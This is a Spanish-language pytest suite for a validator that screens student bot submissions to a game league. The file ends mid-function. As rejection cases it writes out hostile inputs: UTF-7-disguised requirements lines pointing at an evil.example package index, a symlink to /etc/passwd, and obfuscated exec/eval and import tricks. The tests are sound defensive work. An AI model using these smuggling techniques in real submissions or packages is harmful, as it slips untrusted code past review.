"""Validador de entregas: carpeta, equipo.toml, INFORME.md, código, requirements y humo."""

import json
import os
import shutil
import subprocess
import sys
from dataclasses import replace
from pathlib import Path

import pytest

from config import RAIZ, SISTEMA, limites_prueba
from validador import reglas, requirements, validar
from validador.validar import validar_equipo, validar_nombre_nuevo

L = limites_prueba()
MONTECARLO = RAIZ / "estudiantes" / "montecarlo"
EQUIPOS = Path(__file__).parent / "equipos"
FIJADAS = requirements.fijadas()

EQUIPO_TOML = """nombre = "{nombre}"
integrantes = [
  {{ nombre = "Ana Pérez", clave_unica = "000123456" }},
  {{ nombre = "Luis Gómez", clave_unica = "000654321" }},
]
"""

INFORME_PROPIO = "# Informe: {nombre}\n\n" + "\n".join(
    f"## {i}. Sección {i}\nNuestro texto propio de la sección {i}: alfa-beta con poda, "
    f"tabla de transposición número {i * 37}, evaluación por material y avance {i * 11}.\n"
    for i in range(1, 10)
)


def copiar(origen: Path, destino: Path) -> Path:
    """Copia una carpeta sin __pycache__ (la caché local no se entrega)."""
    shutil.copytree(origen, destino, ignore=shutil.ignore_patterns("__pycache__"))
    return destino


def equipo(tmp_path: Path, nombre: str = "los_alfa", origen: Path = MONTECARLO) -> Path:
    """Copia de `origen` como equipo de alumnos válido (equipo.toml e informe propios)."""
    carpeta = tmp_path / nombre
    copiar(origen, carpeta)
    (carpeta / "equipo.toml").write_text(EQUIPO_TOML.format(nombre=nombre), encoding="utf-8")
    (carpeta / "INFORME.md").write_text(INFORME_PROPIO.format(nombre=nombre), encoding="utf-8")
    return carpeta


def valida(carpeta: Path, limites=L, **kw):
    kw.setdefault("jugar_humo", False)
    return validar_equipo(carpeta, limites, **kw)


def con_error(reporte, *palabras: str) -> bool:
    """True si algún error menciona todas las palabras."""
    return not reporte.ok and any(all(p in e for p in palabras) for e in reporte.errores)


# --- Participantes nuestros y equipo bien hecho -----------------------------------------


def test_montecarlo_valido():
    # La carpeta real (con o sin __pycache__ local: eso solo es aviso).
    reporte = validar_equipo(MONTECARLO, L, jugar_humo=False, oficial=True)
    assert reporte.ok, reporte.errores
    assert reporte.humo_jugado is False


def test_montecarlo_con_pycache_pasa_con_aviso(tmp_path):
    carpeta = copiar(MONTECARLO, tmp_path / "montecarlo")
    (carpeta / "__pycache__").mkdir()
    (carpeta / "__pycache__" / "strategy.cpython-312.pyc").write_bytes(bytes(32))
    reporte = validar_equipo(carpeta, L, jugar_humo=False, oficial=True)
    assert reporte.ok, reporte.errores
    assert any("__pycache__" in a and "se ignoran" in a for a in reporte.avisos)


def test_random_valido(tmp_path):
    carpeta = copiar(RAIZ / "estudiantes" / "random", tmp_path / "random")
    reporte = valida(carpeta, oficial=True)
    assert reporte.ok, reporte.errores


def test_equipo_bien_hecho_es_valido(tmp_path):
    reporte = valida(equipo(tmp_path))
    assert reporte.ok, reporte.errores
    assert reporte.avisos == []


# --- Nombre -----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "nombre", ["random", "tier_1", "Mi Equipo", "_x", "montecarlo", "_abc", "ab", "a" * 31]
)
def test_nombres_reservados_e_invalidos(tmp_path, nombre):
    carpeta = tmp_path / nombre
    copiar(MONTECARLO, carpeta)
    (carpeta / "equipo.toml").write_text(EQUIPO_TOML.format(nombre=nombre), encoding="utf-8")
    reporte = valida(carpeta)
    assert con_error(reporte, nombre), reporte.errores
    assert validar_nombre_nuevo(nombre)


def test_nombre_nuevo_valido():
    assert validar_nombre_nuevo("los_alfa_beta") == []
    assert validar_nombre_nuevo("los_alfa\n")  # fullmatch: sin salto de línea al final


def test_oficial_permite_reservados(tmp_path):
    carpeta = tmp_path / "tier_1"
    copiar(MONTECARLO, carpeta)
    (carpeta / "equipo.toml").write_text(EQUIPO_TOML.format(nombre="tier_1"), encoding="utf-8")
    assert valida(carpeta, oficial=True).ok


def test_nombre_distinto_en_equipo_toml_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "equipo.toml").write_text(EQUIPO_TOML.format(nombre="otro"), encoding="utf-8")
    assert con_error(valida(carpeta), "estudiantes/los_alfa/equipo.toml", "los_alfa")


# --- equipo.toml ------------------------------------------------------------------------


UN_INTEGRANTE = (
    'nombre = "{nombre}"\nintegrantes = [{{ nombre = "Ana", clave_unica = "000123456" }}]\n'
)


def test_un_integrante_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "equipo.toml").write_text(UN_INTEGRANTE.format(nombre="los_alfa"), "utf-8")
    assert con_error(valida(carpeta), "1 integrantes", "exactamente 2")


def test_un_integrante_oficial_es_aviso(tmp_path):
    carpeta = copiar(MONTECARLO, tmp_path / "tier_3")
    (carpeta / "equipo.toml").write_text(UN_INTEGRANTE.format(nombre="tier_3"), "utf-8")
    reporte = valida(carpeta, oficial=True)
    assert reporte.ok, reporte.errores
    assert any("1 integrante" in a for a in reporte.avisos)


def test_clave_corta_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = EQUIPO_TOML.format(nombre="los_alfa").replace('"000654321"', '"12345"')
    (carpeta / "equipo.toml").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "clave_unica", "6 a 12")


def test_tres_integrantes_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    filas = ", ".join(f'{{ nombre = "P{i}", clave_unica = "00012345{i}" }}' for i in range(3))
    (carpeta / "equipo.toml").write_text(
        f'nombre = "los_alfa"\nintegrantes = [{filas}]\n', encoding="utf-8"
    )
    assert con_error(valida(carpeta), "integrantes")


def test_clave_no_numerica_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = EQUIPO_TOML.format(nombre="los_alfa").replace('"000654321"', '"abc"')
    (carpeta / "equipo.toml").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "clave_unica")


def test_claves_de_ejemplo_son_error(tmp_path):
    carpeta = equipo(tmp_path)
    shutil.copy(MONTECARLO / "equipo.toml", carpeta / "equipo.toml")
    texto = (carpeta / "equipo.toml").read_text(encoding="utf-8")
    (carpeta / "equipo.toml").write_text(texto.replace("montecarlo", "los_alfa"), "utf-8")
    assert con_error(valida(carpeta), "clave_unica")


def test_claves_repetidas_son_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = EQUIPO_TOML.format(nombre="los_alfa").replace('"000654321"', '"000123456"')
    (carpeta / "equipo.toml").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "misma clave_unica")


def test_oficial_acepta_claves_de_ejemplo_repetidas(tmp_path):
    carpeta = tmp_path / "tier_2"
    copiar(MONTECARLO, carpeta)
    texto = (MONTECARLO / "equipo.toml").read_text(encoding="utf-8")
    (carpeta / "equipo.toml").write_text(texto.replace("montecarlo", "tier_2"), "utf-8")
    assert '"000000000"' in texto
    reporte = valida(carpeta, oficial=True)
    assert reporte.ok, reporte.errores


def test_equipo_toml_roto_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "equipo.toml").write_text('nombre = "los_alfa"\nnombre los\n', encoding="utf-8")
    assert con_error(valida(carpeta), "equipo.toml, línea 2", "mal escrito")


def test_equipo_toml_enlace_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "equipo.toml").unlink()
    (carpeta / "equipo.toml").symlink_to(MONTECARLO / "equipo.toml")
    reporte = valida(carpeta)
    assert con_error(reporte, "equipo.toml", "enlace")
    assert not any("Falta equipo.toml" in e for e in reporte.errores)


# --- INFORME.md -------------------------------------------------------------------------


def test_copia_de_montecarlo_sin_cambiar_informe_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    shutil.copy(MONTECARLO / "INFORME.md", carpeta / "INFORME.md")
    assert con_error(valida(carpeta), "INFORME.md", "montecarlo")


def test_informe_casi_identico_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = (MONTECARLO / "INFORME.md").read_text(encoding="utf-8")
    texto = texto.replace("montecarlo", "los_alfa").replace(
        "(Ejemplo de cómo llenar el informe. El tuyo debe ser más específico: números, "
        "tablas, decisiones.)",
        "",
    )
    (carpeta / "INFORME.md").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "INFORME.md", "copia")


def test_informe_con_texto_de_plantilla_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = INFORME_PROPIO.format(nombre="los_alfa") + "\nEjemplo de cómo llenar el informe.\n"
    (carpeta / "INFORME.md").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "INFORME.md", "plantilla")


def test_informe_sin_llenar_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    vacio = "# Informe\n\n" + "\n".join(f"## {i}. {s}\n" for i, s in enumerate("abcdefghi", 1))
    (carpeta / "INFORME.md").write_text(vacio, encoding="utf-8")
    assert con_error(valida(carpeta), "INFORME.md", "vacía")


def test_informe_titulos_en_bloque_de_codigo_no_cuentan(tmp_path):
    carpeta = equipo(tmp_path)
    texto = INFORME_PROPIO.format(nombre="los_alfa").replace(
        "## 7. Sección 7", "```\n## 7. Sección 7\n```"
    )
    (carpeta / "INFORME.md").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "INFORME.md", "7. Resultados")


def test_informe_subsecciones_son_contenido(tmp_path):
    carpeta = equipo(tmp_path)
    texto = INFORME_PROPIO.format(nombre="los_alfa")
    inicio = texto.index("## 3. Sección 3")
    fin = texto.index("## 4.")
    texto = texto[:inicio] + "## 3. Búsqueda\n### 3.1 Alfa-beta\nPoda con orden.\n" + texto[fin:]
    (carpeta / "INFORME.md").write_text(texto, encoding="utf-8")
    reporte = valida(carpeta)
    assert reporte.ok, reporte.errores


@pytest.mark.parametrize("sin_llenar", ["copia", "plantilla", "vacia"])
def test_informe_sin_llenar_en_modo_prueba_es_aviso(tmp_path, sin_llenar):
    carpeta = equipo(tmp_path)
    informe = carpeta / "INFORME.md"
    if sin_llenar == "copia":
        shutil.copy(MONTECARLO / "INFORME.md", informe)
    elif sin_llenar == "plantilla":
        texto = informe.read_text("utf-8") + "\nEjemplo de cómo llenar el informe\n"
        informe.write_text(texto, "utf-8")
    else:
        informe.write_text(
            "# Informe\n\n" + "\n".join(f"## {i}. {s}\n" for i, s in enumerate("abcdefghi", 1)),
            "utf-8",
        )
    entrega = valida(carpeta)
    assert not entrega.ok and any("INFORME.md" in e for e in entrega.errores)
    prueba = valida(carpeta, entrega=False)
    assert prueba.ok, prueba.errores
    assert any("Antes de entregar completa tu INFORME.md" in a for a in prueba.avisos)


def test_modo_prueba_no_perdona_lo_demas(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "INFORME.md").unlink()
    (carpeta / "rapido.so").write_bytes(b"x")
    reporte = valida(carpeta, entrega=False)
    assert con_error(reporte, "Falta estudiantes/los_alfa/INFORME.md")
    assert con_error(reporte, "rapido.so")


def test_informe_sin_seccion_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    texto = INFORME_PROPIO.format(nombre="los_alfa").replace("## 7. Sección 7", "Sección 7")
    (carpeta / "INFORME.md").write_text(texto, encoding="utf-8")
    assert con_error(valida(carpeta), "INFORME.md", "7")


def test_sin_informe_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "INFORME.md").unlink()
    assert con_error(valida(carpeta), "INFORME.md")


def test_sin_informe_de_montecarlo_es_aviso(tmp_path, monkeypatch):
    monkeypatch.setattr(validar, "INFORME_EJEMPLO", tmp_path / "no_existe.md")
    reporte = valida(equipo(tmp_path))
    assert reporte.ok, reporte.errores
    assert any("montecarlo" in a for a in reporte.avisos)


# --- strategy.py e imports --------------------------------------------------------------


def test_sin_jugar_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "strategy.py").write_text("def preparar(config):\n    pass\n", encoding="utf-8")
    assert con_error(valida(carpeta), "jugar")


def test_strategy_con_error_de_sintaxis(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "strategy.py").write_text("def jugar(:\n", encoding="utf-8")
    assert con_error(valida(carpeta), "strategy.py", "línea 1")


@pytest.mark.parametrize(
    "codigo",
    ["import torch", "from torch import nn", "import tensorflow.keras", "import jax.numpy as jnp"],
)
def test_import_torch_es_error(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    with (carpeta / "strategy.py").open("a", encoding="utf-8") as f:
        f.write(f"\n{codigo}\n")
    assert con_error(valida(carpeta), "strategy.py", codigo.split()[1].split(".")[0])


@pytest.mark.parametrize(
    "codigo",
    [
        "from arbitro import partida",
        "import liga",
        "import estudiantes.random",
        "__import__('arbitro')",
        "importlib.import_module('validador')",
    ],
)
def test_import_arbitro_es_error(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(f"import importlib\n{codigo}\n", encoding="utf-8")
    assert con_error(valida(carpeta), "ayuda.py")


def test_herramientas_con_redes_es_aviso(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "herramientas" / "entrenar.py").write_text("import torch\n", encoding="utf-8")
    reporte = valida(carpeta)
    assert reporte.ok, reporte.errores
    assert any("herramientas/entrenar.py" in a and "torch" in a for a in reporte.avisos)


def test_herramientas_con_arbitro_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "herramientas" / "x.py").write_text("from arbitro import partida\n", "utf-8")
    assert con_error(valida(carpeta), "herramientas/x.py", "arbitro")


@pytest.mark.parametrize(
    "codigo",
    ["import herramientas.entrenar", "from herramientas import x", "from . import herramientas"],
)
def test_importar_herramientas_en_la_liga_es_error(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(f"{codigo}\n", encoding="utf-8")
    assert con_error(valida(carpeta), "ayuda.py", "no se ejecuta en la liga")


@pytest.mark.parametrize(
    "codigo",
    [
        "__import__(name='arbitro')",
        "from importlib import import_module as im\nim('arbitro')",
        "import importlib as il\nil.import_module('liga.tabla')",
        "exec('import arbitro')",
        "exec('exec(\\'import validador\\')')",
        "import builtins\nbuiltins.exec('import arbitro')",
    ],
)
def test_imports_disfrazados_son_error(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(f"{codigo}\n", encoding="utf-8")
    assert con_error(valida(carpeta), "ayuda.py", "no se permite importar")


@pytest.mark.parametrize(
    "codigo",
    [
        "m = 'arb' + 'itro'\n__import__(m)",
        "import importlib\nimportlib.import_module(nombre)",
        "exec(codigo)",
        "eval(texto)",
        "f = eval",
        "import builtins\ngetattr(builtins, 'ex' + 'ec')('x')",
        "import runpy\nrunpy.run_path('otro.py')",
        "import sys\nsys.path.append('herramientas')",
        "__builtins__['exec']('x')",
        "import builtins\nbuiltins.__dict__['eval']('1')",
        "vars(builtins)['exec']('x')",
        "globals()['__builtins__']",
        "import pkgutil\npkgutil.resolve_name('os:system')",
        "import code\ncode.InteractiveInterpreter().runsource('x')",
        "exec(b'x = 1')",
        "import builtins\ne = builtins.eval",
    ],
)
def test_carga_dinamica_es_aviso(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(f"{codigo}\n", encoding="utf-8")
    reporte = valida(carpeta)
    assert reporte.ok, reporte.errores
    assert any("ayuda.py" in a and "revisará a mano" in a for a in reporte.avisos)


def test_exec_de_bytes_con_import_prohibido_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text("exec(b'import arbitro')\n", encoding="utf-8")
    assert con_error(valida(carpeta), "ayuda.py", "arbitro")


@pytest.mark.parametrize(
    "codigo",
    [
        "def compile(x):\n    return x\n\ncompile(datos)",
        "from re import compile\nPATRON = compile(texto)",
        "eval = len\neval(lista)",
        "from .arbitro import tabla",
        "from . import liga",
    ],
)
def test_nombres_propios_no_son_avisos(tmp_path, codigo):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(f"{codigo}\n", encoding="utf-8")
    reporte = valida(carpeta)
    assert reporte.ok and reporte.avisos == [], (reporte.errores, reporte.avisos)


def test_codigo_normal_sin_avisos(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text(
        '"""Lee datos de herramientas/ (solo el docstring lo menciona)."""\n'
        "import re\nPATRON = re.compile('a+')\nimport importlib\n",
        encoding="utf-8",
    )
    reporte = valida(carpeta)
    assert reporte.ok and reporte.avisos == [], (reporte.errores, reporte.avisos)


def test_codigo_muy_anidado_no_rompe(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "ayuda.py").write_text("x = " + "(" * 5000 + ")" * 5000 + "\n", "utf-8")
    assert con_error(valida(carpeta), "ayuda.py")


def test_carpeta_llamada_py_no_rompe(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "raro.py").mkdir()
    (carpeta / "raro.py" / "dentro.txt").write_text("hola", encoding="utf-8")
    assert valida(carpeta).ok


# --- Archivos ---------------------------------------------------------------------------


def test_binario_en_data_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "data" / "tabla.dat").write_bytes(b"\x7fELF\x02\x01\x01" + bytes(100))
    assert con_error(valida(carpeta), "data/tabla.dat", "ELF")


def test_extension_binaria_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "rapido.so").write_bytes(b"cualquier cosa")
    assert con_error(valida(carpeta), "rapido.so")


def test_ejecutable_windows_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    cabecera = bytearray(0x80)
    cabecera[:2] = b"MZ"
    cabecera[0x3C:0x40] = (0x40).to_bytes(4, "little")
    cabecera[0x40:0x44] = b"PE\x00\x00"
    (carpeta / "data" / "x.bin").write_bytes(bytes(cabecera))
    assert con_error(valida(carpeta), "PE")


def test_ejecutable_windows_con_cabecera_lejana_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    cabecera = bytearray(0x3000)
    cabecera[:2] = b"MZ"
    cabecera[0x3C:0x40] = (0x2000).to_bytes(4, "little")  # más allá de los primeros 4 KB
    cabecera[0x2000:0x2004] = b"PE\x00\x00"
    (carpeta / "data" / "x.bin").write_bytes(bytes(cabecera))
    assert con_error(valida(carpeta), "PE")


def test_mach_o_universal_es_error_y_java_no(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "data" / "mac.bin").write_bytes(b"\xca\xfe\xba\xbe" + (2).to_bytes(4, "big"))
    assert con_error(valida(carpeta), "Mach-O")
    (carpeta / "data" / "mac.bin").unlink()
    (carpeta / "data" / "Tabla.class").write_bytes(b"\xca\xfe\xba\xbe\x00\x00\x00\x34")
    assert valida(carpeta).ok


def test_datos_normales_no_son_binarios(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "data" / "tabla.txt").write_text("MZ no es un ejecutable\n", encoding="utf-8")
    (carpeta / "data" / "pesos.pkl").write_bytes(b"\x80\x05" + bytes(64))
    assert valida(carpeta).ok


def test_pyc_suelto_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "secreto.pyc").write_bytes(b"\x00" * 32)
    assert con_error(valida(carpeta), "secreto.pyc", "Borra los .pyc")
    (carpeta / "secreto.pyc").unlink()
    (carpeta / "data" / "viejo.pyo").write_bytes(b"\x00" * 32)
    assert con_error(valida(carpeta), "data/viejo.pyo")


def test_pycache_es_aviso(tmp_path):
    carpeta = equipo(tmp_path)
    for sub in ("__pycache__", "herramientas/__pycache__"):
        (carpeta / sub).mkdir()
        (carpeta / sub / "x.cpython-312.pyc").write_bytes(bytes(32))
    reporte = valida(carpeta)
    assert reporte.ok, reporte.errores
    assert any("herramientas/__pycache__" in a and "se ignoran" in a for a in reporte.avisos)


def test_binario_dentro_de_pycache_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "__pycache__").mkdir()
    (carpeta / "__pycache__" / "x.so").write_bytes(b"\x7fELF")
    assert con_error(valida(carpeta), "__pycache__/x.so")


def test_demasiados_archivos_es_error(tmp_path, monkeypatch):
    monkeypatch.setattr(reglas, "MAX_ARCHIVOS", 10)
    carpeta = equipo(tmp_path)
    for i in range(12):
        (carpeta / "data" / f"{i}.txt").write_text("x", encoding="utf-8")
    assert con_error(valida(carpeta), "más de 10 archivos")


def test_enlace_simbolico_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "data" / "fuera").symlink_to("/etc/passwd")
    assert con_error(valida(carpeta), "enlace")


def test_carpeta_muy_grande_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "data" / "a.npy").write_bytes(bytes(700 * 1024))
    (carpeta / "data" / "b.npy").write_bytes(bytes(700 * 1024))
    reporte = valida(carpeta, limites=replace(L, carpeta_mb=1, archivo_mb=1))
    assert con_error(reporte, "carpeta", "1 MB")


def test_archivo_muy_grande_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    with (carpeta / "data" / "enorme.npy").open("wb") as f:
        f.truncate((L.archivo_mb + 1) * 1024 * 1024)  # archivo disperso: no ocupa disco
    assert con_error(valida(carpeta), "data/enorme.npy", f"{L.archivo_mb} MB")


def test_archivo_sin_permiso_de_lectura_es_aviso(tmp_path):
    carpeta = equipo(tmp_path)
    archivo = carpeta / "data" / "privado.txt"
    archivo.write_text("hola", encoding="utf-8")
    archivo.chmod(0o600)
    reporte = valida(carpeta)
    assert reporte.ok, reporte.errores
    assert any("data/privado.txt" in a and "chmod" in a for a in reporte.avisos)


# --- requirements.txt -------------------------------------------------------------------


def escribir_requirements(tmp_path: Path, texto: str):
    carpeta = equipo(tmp_path)
    (carpeta / "requirements.txt").write_text(texto, encoding="utf-8")
    return valida(carpeta)


def test_requirements_valido(tmp_path):
    reporte = escribir_requirements(tmp_path, "# extra\n\nsortedcontainers==2.4.0  # árbol\n")
    assert reporte.ok, reporte.errores


def test_requirements_sin_version_es_error(tmp_path):
    assert con_error(escribir_requirements(tmp_path, "sortedcontainers\n"), "línea 1")


@pytest.mark.parametrize(
    "linea",
    [
        "sortedcontainers>=2.4",
        "sortedcontainers==2.*",
        "-e .",
        "--index-url https://example.com/simple",
        "-r otro.txt",
        "--no-binary=:all:",
        "https://example.com/paquete.whl",
        "paquete @ https://example.com/p.whl",
        "paquete@git+https://example.com/p",
        "sortedcontainers[extra]==2.4.0",
        "sortedcontainers==2.4.0 --hash=sha256:abc",
        "sortedcontainers==2.4.0; python_version>'3'",
        "sortedcontainers==2.4.0+local",
        "sortedcontainers==1.tar.gz",
        "sortedcontainers==1.whl",
        "sortedcontainers==2.4.zip",
        "sortedcontainers==2.4.0.x",
        "./paquete",
    ],
)
def test_requirements_lineas_prohibidas(linea):
    errores, limpias = requirements.auditar_lineas(f"{linea}\n", FIJADAS)
    assert errores and "línea 1" in errores[0]
    assert limpias == []


@pytest.mark.parametrize(
    "version", ["2.4.0", "1!2.0", "2.0rc1", "2.0.post1", "2.0.dev3", "2.0a1.post2.dev1", "2"]
)
def test_requirements_versiones_pep440_validas(version):
    assert requirements.auditar_lineas(f"sortedcontainers=={version}\n", {})[0] == []


def test_requirements_comentario_con_url_es_valido():
    errores, limpias = requirements.auditar_lineas(
        "sortedcontainers==2.4.0 # ver https://pypi.org/x @ahi\n# otro https://x\n", FIJADAS
    )
    assert errores == [] and limpias == ["sortedcontainers==2.4.0"]


@pytest.mark.parametrize(
    "datos",
    [
        b"# -*- coding: utf-7 -*-\n+AC0ALQ-extra-index-url https://evil.example/simple\n",
        b"sortedcontainers==2.4.0\n# vim: set fileencoding=utf-7 :\n",
        "sortedcontainers==2.4.0\n".encode("utf-16"),
        b"sortedcontainers==2.4.0 # \xff\xfe\n",
    ],
)
def test_requirements_codificacion_rara_es_error(datos):
    errores, limpias = requirements.auditar_archivo(datos, FIJADAS)
    assert errores and limpias == []


def test_requirements_bom_utf8_se_acepta():
    errores, limpias = requirements.auditar_archivo(b"\xef\xbb\xbfsortedcontainers==2.4.0\n", {})
    assert errores == [] and limpias == ["sortedcontainers==2.4.0"]


def test_requirements_utf7_en_la_carpeta_es_error(tmp_path):
    carpeta = equipo(tmp_path)
    (carpeta / "requirements.txt").write_bytes(
        b"# -*- coding: utf-7 -*-\n+AC0-e git+https://evil.example/x.git\n"
    )
    assert con_error(valida(carpeta), "requirements.txt", "codificación")


def test_requirements_lista_negra_es_error(tmp_path):
    assert con_error(escribir_requirements(tmp_path, "Torch==2.5.0\n"), "Torch", "prohibido")
    assert requirements.auditar_lineas("JaxLib==0.4.30\n", {})[0]  # nombre normalizado


def test_requirements_que_cambia_numpy_es_error(tmp_path):
    reporte = escribir_requirements(tmp_path, "numpy==1.26.4\n")
    assert con_error(reporte, "numpy", FIJADAS["numpy"])
    assert requirements.auditar_lineas(f"numpy=={FIJADAS['numpy']}\n", FIJADAS)[0] == []
    # PEP 440: 2.4.6.0 es la misma versión que 2.4.6.
    assert requirements.auditar_lineas(f"numpy=={FIJADAS['numpy']}.0\n", FIJADAS)[0] == []


@pytest.mark.parametrize(
    ("a", "b", "iguales"),
    [
        ("2.4.6", "2.4.6.0", True),
        ("1.0a1", "1.0alpha1", True),
        ("1.0", "1.2", False),
        ("v1.0", "1.0", True),
        ("1.0rc1", "1.0c1", True),
        ("1.0.post1", "1.0", False),
    ],
)
def test_misma_version(a, b, iguales):
    assert requirements.misma_version(a, b) is iguales
    normal = requirements.normalizar_version  # sin `packaging` (imagen de bots)
    assert (normal(a) == normal(b)) is iguales


def paquete_pip(nombre: str, version: str, requested: bool = False, url: str | None = None):
    url = url or f"https://files.pythonhosted.org/packages/x/{nombre}-{version}-py3-none-any.whl"
    return {
        "metadata": {"name": nombre, "version": version},
        "requested": requested,
        "download_info": {"url": url, "archive_info": {}},
    }


def test_requirements_resolucion_valida():
    reporte = {"install": [paquete_pip("sortedcontainers", "2.4.0", True)]}
    assert requirements.auditar_resolucion(reporte, FIJADAS) == []


def test_requirements_transitiva_prohibida_es_error():
    reporte = {
        "install": [
            paquete_pip("inocente", "1.0", requested=True),
            paquete_pip("Torch", "2.5.0"),
        ]
    }
    errores = requirements.auditar_resolucion(reporte, FIJADAS)
    assert len(errores) == 1 and "indirecta" in errores[0] and "Torch" in errores[0]


def test_requirements_transitiva_que_cambia_numpy_es_error():
    reporte = {"install": [paquete_pip("inocente", "1.0", True), paquete_pip("NumPy", "1.26.4")]}
    errores = requirements.auditar_resolucion(reporte, FIJADAS)
    assert len(errores) == 1 and "NumPy" in errores[0]


def test_requirements_resolucion_sin_wheel_es_error():
    git = paquete_pip("raro", "1.0", True, url="https://github.com/x/raro.git")
    sdist = paquete_pip("viejo", "1.0", True, url="https://files.pythonhosted.org/viejo-1.0.tar.gz")
    otro = paquete_pip(
        "espejo", "1.0", True, url="https://evil.example/espejo-1.0-py3-none-any.whl"
    )
    errores = requirements.auditar_resolucion({"install": [git, sdist, otro]}, FIJADAS)
    assert len(errores) == 3


def correr_modulo(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "validador.requirements", *args],
        capture_output=True,
        text=True,
        cwd=SISTEMA,
        env={**os.environ, "PYTHONPATH": str(SISTEMA)},
    )


def test_modulo_requirements_por_linea_de_comandos(tmp_path):
    bueno, malo = tmp_path / "bueno.txt", tmp_path / "malo.txt"
    bueno.write_text("sortedcontainers==2.4.0\n", encoding="utf-8")
    malo.write_text("--index-url https://evil.example/simple\n", encoding="utf-8")
    limpio = tmp_path / "limpio.txt"
    assert correr_modulo("--lineas", str(bueno), "--salida", str(limpio)).returncode == 0
    assert limpio.read_text(encoding="ascii") == "sortedcontainers==2.4.0\n"
    utf7 = tmp_path / "utf7.txt"
    utf7.write_bytes(b"# -*- coding: utf-7 -*-\n+AC0-e git+https://evil.example/x.git\n")
    otro_limpio = tmp_path / "otro_limpio.txt"
    salida = correr_modulo("--lineas", str(utf7), "--salida", str(otro_limpio))
    assert salida.returncode == 1 and not otro_limpio.exists()
    salida = correr_modulo("--lineas", str(malo))
    assert salida.returncode == 1 and "opción de pip" in salida.stderr

    resolucion = tmp_path / "resolucion.json"
    resolucion.write_text(json.dumps({"install": [paquete_pip("jaxlib", "0.4")]}), "utf-8")
    salida = correr_modulo(str(resolucion))
    assert salida.returncode == 1 and "jaxlib" in salida.stderr
    assert correr_modulo().returncode == 2


# --- Partidas de humo -------------------------------------------------------------------


def test_humo_bot_sano_pasa(tmp_path):
    carpeta = equipo(tmp_path, origen=RAIZ / "estudiantes" / "random")
    reporte = validar_equipo(carpeta, L, jugar_humo=True)
    assert reporte.ok, reporte.errores
    assert reporte.humo_jugado


def test_humo_detecta_bot_roto(tmp_path):
    carpeta = equipo(tmp_path, origen=EQUIPOS / "roto")
    reporte = validar_equipo(carpeta, L, jugar_humo=True)
    assert con_error(reporte, "prueba", "error"), reporte.errores
    assert any("ZeroDivisionError" in e for e in reporte.errores)


def test_humo_no_corre_si_hay_errores(tmp_path, monkeypatch):
    carpeta = equipo(tmp_path)
    (carpeta / "rapido.so").write_bytes(b"x")
    monkeypatch.setattr(validar, "jugar_partida", lambda *a, **k: pytest.fail("no debe jugar"))
    reporte = validar_equipo(carpeta, L, jugar_humo=True)
    assert not reporte.ok


def test_humo_con_docker_usa_imagenes(tmp_path, monkeypatch):
    carpeta = equipo(tmp_path)
    vistos = []

    def falsa(blancas, negras, *args):
        vistos.append((blancas, negras))
        return validar.ResultadoPartida(
            ganador="", motivo="error", puntos={}, falla_infraestructura=True
        )

    monkeypatch.setattr(validar, "jugar_partida", falsa)
    reporte = validar_equipo(carpeta, L, jugar_humo=True, docker=True)
    assert len(vistos) == 2
    imagenes = {b.imagen for par in vistos for b in par}
    assert imagenes == {"torneo-bot:los_alfa", validar.IMAGEN_RIVAL}
    assert reporte.ok and any("infraestructura" in a for a in reporte.avisos)
    assert reporte.humo_jugado is False


def _avisos_humo_con_preparar(tmp_path, monkeypatch, segundos: float) -> list[str]:
    """Avisos del humo si `preparar` de ambos bots tarda `segundos` (partidas falsas)."""

    def falsa(*args):
        return validar.ResultadoPartida(
            ganador="blancas",
            motivo="puntos",
